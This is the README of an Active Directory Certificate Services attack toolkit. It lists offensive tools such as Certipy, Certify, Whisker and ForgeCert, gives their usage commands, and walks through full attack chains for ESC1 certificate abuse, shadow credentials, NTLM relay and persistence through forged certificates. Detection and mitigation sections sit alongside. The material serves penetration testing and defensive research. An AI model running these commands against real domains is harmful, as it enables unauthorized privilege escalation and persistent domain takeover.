# ADCS Attack Toolkit

A comprehensive collection of tools for Active Directory Certificate Services (ADCS) exploitation and assessment. This repository contains both offensive and defensive tools for security researchers, penetration testers, and red team operators.

## ⚠️ Legal Disclaimer

**IMPORTANT**: These tools are provided for educational purposes, authorized security assessments, penetration testing, and defensive security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before using these tools.

## 📋 Table of Contents

- [Overview](#overview)
- [ADCS Attack Techniques](#adcs-attack-techniques)
- [📖 Detailed Attack Guides & Documentation](#-detailed-attack-guides--documentation)
- [Tools Included](#tools-included)
- [🤖 Automation Scripts](#-automation-scripts)
- [🧪 Lab Environment](#-lab-environment)
- [Installation & Setup](#installation--setup)
- [Usage Examples](#usage-examples)
- [Attack Chain Workflow](#attack-chain-workflow)
- [References](#references)

## 🎯 Overview

Active Directory Certificate Services (ADCS) is a Windows Server role that provides public key infrastructure (PKI) functionality. Misconfigurations in ADCS can lead to privilege escalation, persistence, and lateral movement opportunities in Active Directory environments.

This toolkit includes tools for:
- Certificate template enumeration and abuse
- Kerberos authentication attacks (PKINIT)
- Shadow credentials manipulation
- Certificate-based authentication
- ESC1-ESC16 attack path exploitation

## 🔓 ADCS Attack Techniques

### ESC1-ESC16 Overview

The "Certified Pre-Owned" research identified multiple privilege escalation techniques:

- **ESC1**: Misconfigured Certificate Templates
- **ESC2**: Misconfigured Certificate Templates (Any Purpose EKU)
- **ESC3**: Enrollment Agent Templates
- **ESC4**: Vulnerable Certificate Template Access Control
- **ESC5**: Vulnerable PKI Object Access Control
- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- **ESC7**: Vulnerable Certificate Authority Access Control
- **ESC8**: NTLM Relay to AD CS HTTP Endpoints
- **ESC9-ESC16**: Additional advanced techniques

**Note**: As of February 2025, StrongCertificateBindingEnforcement will default to Full Enforcement mode, affecting some attack vectors.

## 📖 Detailed Attack Guides & Documentation

Comprehensive exploitation guides for each ESC technique with step-by-step instructions, detection strategies, and remediation:

### [📚 Documentation Hub](docs/README.md)

**Attack Exploitation Guides**:
- **[ESC1 Guide](docs/ESC1_Guide.md)** - Misconfigured certificate templates with arbitrary SAN
  - Enumeration with Certify, Certipy, PowerShell
  - Certificate request and authentication procedures
  - Detection: Event 4887 with SAN mismatches, Splunk/KQL queries, Sigma rules
  - Remediation: Remove ENROLLEE_SUPPLIES_SUBJECT, restrict enrollment

- **[ESC2 Guide](docs/ESC2_Guide.md)** - Any Purpose EKU and Subordinate CA exploitation
  - Three variants: Any Purpose, No EKU, Subordinate CA
  - ForgeCert usage for rogue CA attacks
  - Detection: Any Purpose certificate issuance monitoring
  - Remediation: Replace with specific EKUs, restrict SubCA template

- **[ESC3 Guide](docs/ESC3_Guide.md)** - Enrollment Agent template abuse
  - Two-step attack: Agent certificate → Target certificate
  - On-behalf-of enrollment exploitation
  - Detection: Event 4887 with enrollment agent patterns
  - Remediation: Configure enrollment agent restrictions

- **[ESC4 Guide](docs/ESC4_Guide.md)** - Certificate template ACL modification
  - GenericAll, WriteDacl, WriteOwner exploitation
  - Template property modification techniques
  - Detection: Event 5136 (AD object modification)
  - Remediation: Harden template ACLs, remove write permissions

- **[ESC6 & ESC8 Guide](docs/ESC6_ESC8_Guide.md)** - CA configuration and NTLM relay
  - **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2 flag abuse
  - **ESC8**: NTLM relay to web enrollment endpoints
  - ntlmrelayx + PetitPotam attack chains
  - Detection: SAN in requests, NTLM relay patterns
  - Remediation: Disable ESC6 flag, enable EPA, HTTPS-only

**Defense & Detection**:
- **[Detection Playbook](docs/Detection_Playbook.md)** - Comprehensive defense strategies
  - Event log monitoring (4886, 4887, 4768, 5136)
  - SIEM queries: Splunk SPL, Microsoft Sentinel KQL
  - Sigma rules for each ESC technique
  - Behavioral analytics and anomaly detection
  - Incident response procedures
  - Automated hunting scripts

Each guide includes real-world exploitation examples, complete detection coverage, and hardening recommendations.

## 🛠️ Tools Included

### Python-Based Tools

#### 1. Certipy
**Location**: `python_tools/Certipy/`
**Repository**: https://github.com/ly4k/Certipy
**Description**: Python tool for Active Directory Certificate Services enumeration and abuse. Supports all ESC1-ESC16 attack paths.

**Key Features**:
- Enumerate vulnerable certificate templates
- Request and retrieve certificates
- Forge certificates
- Authenticate using certificates
- Support for all known ESC techniques

**Basic Usage**:
```bash
# Find vulnerable certificate templates
certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.10

# Request certificate using ESC1
certipy req -u 'user@domain.local' -p 'password' -ca 'CA-NAME' -target ca.domain.local -template 'VulnerableTemplate'

# Authenticate using certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

#### 2. PKINITtools
**Location**: `python_tools/PKINITtools/`
**Repository**: https://github.com/dirkjanm/PKINITtools
**Description**: Tools for Kerberos PKINIT authentication and relaying to AD CS.

**Components**:
- `gettgtpkinit.py`: Request TGT using certificate
- `getnthash.py`: Extract NT hash from certificate authentication
- `gets4uticket.py`: Obtain service tickets

**Basic Usage**:
```bash
# Request TGT using PFX certificate
python gettgtpkinit.py domain.local/user -cert-pfx user.pfx -pfx-pass 'password' user.ccache

# Extract NT hash
python getnthash.py domain.local/user -key <AS-REP encryption key>
```

#### 3. pyWhisker
**Location**: `python_tools/pywhisker/`
**Repository**: https://github.com/ShutdownRepo/pywhisker
**Description**: Python implementation of Whisker for Shadow Credentials attacks from Linux.

**Basic Usage**:
```bash
# Add shadow credential to target account
python pywhisker.py -d domain.local -u user -p password --target targetuser --action add

# List shadow credentials
python pywhisker.py -d domain.local -u user -p password --target targetuser --action list
```

#### 4. ADCSKiller
**Location**: `python_tools/ADCSKiller/`
**Repository**: https://github.com/grimlockx/ADCSKiller
**Description**: Automated ADCS exploitation tool weaponizing Certipy and Coercer.

**Features**:
- Automated discovery and exploitation
- Combines multiple attack techniques
- Simplified workflow for ADCS attacks

### C# Tools

#### 1. Certify
**Location**: `csharp_tools/Certify/`
**Repository**: https://github.com/GhostPack/Certify
**Description**: C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services. Part of the GhostPack toolkit.

**Basic Usage**:
```powershell
# Find vulnerable certificate templates
Certify.exe find /vulnerable

# Request certificate
Certify.exe request /ca:CA-NAME /template:VulnerableTemplate /altname:Administrator

# Find certificate authorities
Certify.exe cas
```

#### 2. Whisker
**Location**: `csharp_tools/Whisker/`
**Repository**: https://github.com/eladshamir/Whisker
**Description**: C# tool for manipulating msDS-KeyCredentialLink attribute to add Shadow Credentials.

**Requirements**:
- Domain Controller running Windows Server 2016+
- DC must have server authentication certificate for PKINIT

**Basic Usage**:
```powershell
# Add shadow credential
Whisker.exe add /target:targetuser

# List shadow credentials
Whisker.exe list /target:targetuser

# Remove shadow credential
Whisker.exe remove /target:targetuser /deviceid:<device-id>
```

#### 3. PassTheCert
**Location**: `csharp_tools/PassTheCert/`
**Repository**: https://github.com/AlmondOffSec/PassTheCert
**Description**: Authenticate to LDAP/S server with a certificate through Schannel.

**Features**:
- Certificate-based LDAP authentication
- Works with LDAP Channel Binding enabled
- Alternative when PKINIT is not supported

**Basic Usage**:
```powershell
PassTheCert.exe --server dc.domain.local --cert-path user.pfx --cert-pass password
```

#### 4. ForgeCert
**Location**: `csharp_tools/ForgeCert/`
**Repository**: https://github.com/GhostPack/ForgeCert
**Description**: Forge certificates using compromised CA certificate and private key.

**Basic Usage**:
```powershell
# Forge certificate
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath admin.pfx --NewCertPassword password
```

### Legacy/Compiled Binaries

#### Rubeus
**Files**: `Rubeus.dll`, `rub.exe`
**Description**: Kerberos attack toolkit for ticket extraction, manipulation, and credential harvesting.

**Common Operations**:
- Kerberos ticket requests
- AS-REP roasting
- Kerberoasting
- Pass-the-ticket attacks

#### GruntHTTP.ps1
**Description**: PowerShell script for reflective .NET assembly loading. Executes payloads in-memory without touching disk.

## 🤖 Automation Scripts

Custom PowerShell scripts for automated ADCS enumeration and exploitation:

### Enumeration
**[Enumerate-ADCS.ps1](scripts/enumeration/Enumerate-ADCS.ps1)**
- Automated vulnerability scanner for ESC1-ESC6
- HTML report generation with severity classifications
- Checks vulnerable templates, CA configurations, ACLs
- Current user context enumeration

```powershell
# Run full scan
.\Enumerate-ADCS.ps1 -Verbose -OutputFile report.html

# Check specific techniques
.\Enumerate-ADCS.ps1 -CheckESC1 -CheckESC4
```

### Exploitation
**[Invoke-ADCSAttack.ps1](scripts/exploitation/Invoke-ADCSAttack.ps1)**
- Automated attack framework for ESC1, ESC2, ESC3, ESC6
- Auto-detects CA infrastructure
- Handles certificate conversion (PEM → PFX)
- Optional automatic Rubeus authentication

```powershell
# ESC1 attack
.\Invoke-ADCSAttack.ps1 -AttackType ESC1 -Template VulnerableTemplate -Target Administrator -AutoAuthenticate

# ESC3 enrollment agent abuse
.\Invoke-ADCSAttack.ps1 -AttackType ESC3 -EnrollmentAgentTemplate AgentTemplate -Template UserAuthTemplate -Target Administrator
```

## 🧪 Lab Environment

**[Lab Setup Guide](lab/Lab_Setup_Guide.md)** - Complete vulnerable ADCS lab configuration:

**Infrastructure**:
- Domain Controller with AD CS installation
- Certificate Authority configuration
- Web enrollment setup (ESC8)
- Attack workstation setup (Windows + Linux)

**Vulnerable Templates**:
- ESC1: ENROLLEE_SUPPLIES_SUBJECT enabled
- ESC2: Any Purpose EKU configured
- ESC3: Enrollment Agent with target templates
- ESC4: Weak ACLs (GenericAll for Domain Users)
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
- ESC8: Web enrollment without EPA

**Training Scenarios**:
- Privilege escalation exercises
- Detection rule validation
- Blue team training
- Red team operations practice

```powershell
# Quick lab verification
.\Certify.exe find /vulnerable  # Should find all ESC1-6 vulnerabilities
```

## 📦 Installation & Setup

### Python Tools Setup

1. **Install Python dependencies**:
```bash
cd python_tools/Certipy
pip install -r requirements.txt

cd ../PKINITtools
pip install -r requirements.txt

cd ../pywhisker
pip install -r requirements.txt

cd ../ADCSKiller
pip install -r requirements.txt
```

### C# Tools Compilation

Most C# tools require compilation in Visual Studio:

```bash
# Example for Certify
cd csharp_tools/Certify/Certify
dotnet build -c Release
```

### Dependencies

- **Python**: 3.7+
- **.NET**: Framework 4.7.2+ or .NET Core 3.1+
- **Visual Studio** (for C# compilation)
- **Impacket** (for PKINITtools)

## 🎓 Usage Examples

### Complete Attack Chain Example

```bash
# 1. Enumerate vulnerable templates
certipy find -u 'lowpriv@domain.local' -p 'password' -dc-ip 10.10.10.10

# 2. Request certificate for administrator
certipy req -u 'lowpriv@domain.local' -p 'password' -ca 'DOMAIN-CA' -target ca.domain.local -template 'ESC1Template' -upn 'administrator@domain.local'

# 3. Authenticate and get TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# 4. Use TGT for further attacks
export KRB5CCNAME=administrator.ccache
```

### Shadow Credentials Attack

```bash
# 1. Add shadow credential (Linux)
python pywhisker.py -d domain.local -u user -p password --target targetcomputer$ --action add

# 2. Get TGT using certificate
python gettgtpkinit.py domain.local/targetcomputer$ -cert-pfx certificate.pfx -pfx-pass password target.ccache

# 3. Extract NT hash
python getnthash.py domain.local/targetcomputer$ -key <AS-REP key>
```

## 🔄 Attack Chain Workflow

```
┌─────────────────────────────────────────────────────────────┐
│                   ADCS Attack Chain                          │
└─────────────────────────────────────────────────────────────┘

1. Reconnaissance
   └─> Certipy find / Certify.exe find
       └─> Identify vulnerable templates (ESC1-ESC16)
       └─> Enumerate CAs and permissions

2. Certificate Request/Manipulation
   └─> ESC1-ESC7: Template-based attacks
       └─> Request certificate with alternate identity
   └─> ESC8: NTLM relay attacks
   └─> Shadow Credentials: Whisker/pyWhisker

3. Authentication
   └─> PKINITtools: Kerberos PKINIT authentication
   └─> PassTheCert: LDAP/S authentication
   └─> Certipy auth: Direct authentication

4. Privilege Escalation
   └─> Obtain TGT as privileged user
   └─> Extract NT hash
   └─> Perform lateral movement

5. Persistence
   └─> ForgeCert: Forge golden certificates
   └─> Maintain shadow credentials
   └─> Create backdoor certificate templates
```

## 📚 References

### Research Papers & Blogs

- **Certified Pre-Owned**: https://posts.specterops.io/certified-pre-owned-d95910965cd2
- **ADCS Attack Paths**: https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
- **Shadow Credentials**: https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab

### Official Documentation

- Microsoft ADCS: https://docs.microsoft.com/en-us/windows-server/identity/ad-cs/
- Kerberos PKINIT: https://www.rfc-editor.org/rfc/rfc4556

### Security Advisories

- **StrongCertificateBindingEnforcement** (2025 update): https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16

## 🔐 Detection & Mitigation

### Detection Strategies

- Monitor Event ID 4886 (Certificate Services template loaded)
- Monitor Event ID 4887 (Certificate Services approved)
- Track unusual certificate requests
- Monitor msDS-KeyCredentialLink modifications
- Analyze Kerberos authentication patterns (Event ID 4768)

### Mitigation

1. **Template Hardening**:
   - Remove vulnerable EKUs
   - Enable Manager Approval
   - Disable client authentication where not needed
   - Implement proper ACLs

2. **CA Security**:
   - Enable Strong Certificate Binding (Feb 2025)
   - Implement LDAP signing and channel binding
   - Restrict CA web enrollment
   - Monitor administrative access

3. **General**:
   - Regular security audits of certificate templates
   - Implement least privilege for certificate enrollment
   - Monitor for shadow credential modifications
   - Keep systems patched

## 📄 License

Individual tools maintain their original licenses. Please refer to each tool's repository for specific licensing information.

## 🙏 Credits

- **Certipy**: ly4k
- **Certify**: Will Schroeder (@harmj0y) and Lee Christensen (@tifkin_)
- **Whisker**: Elad Shamir
- **pyWhisker**: Shutdown (@_nwodtuhs)
- **PKINITtools**: Dirk-jan Mollema (@_dirkjan)
- **PassTheCert**: Almond Offensive Security
- **ForgeCert**: GhostPack
- **ADCSKiller**: Grimlockx
- **Rubeus**: GhostPack

Special thanks to the security research community for advancing understanding of ADCS security.

---

**Last Updated**: November 2025
**Maintained by**: Hardik Mehta (@hardw00t)
